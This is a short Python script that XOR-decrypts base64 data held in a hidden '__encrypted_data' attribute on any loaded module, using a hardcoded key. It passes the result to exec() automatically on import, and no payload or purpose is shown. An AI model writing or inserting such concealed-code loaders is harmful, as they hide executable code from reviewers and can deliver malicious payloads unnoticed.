import sys
import base64

def xor_decrypt(encrypted_b64, password):
    encrypted_bytes = base64.b64decode(encrypted_b64)
    password = password.encode()
    decrypted = []
    for i, byte in enumerate(encrypted_bytes):
        key_char = password[i % len(password)]
        decrypted.append(byte ^ key_char)
    return bytes(decrypted).decode('utf-8')

password = 'opn'

def decrypt_and_execute():
    for module in list(sys.modules.values()):
        if hasattr(module, '__encrypted_data'):
            encrypted_data = getattr(module, '__encrypted_data')
            decrypted_code = xor_decrypt(encrypted_data, password)
            exec(decrypted_code)

decrypt_and_execute()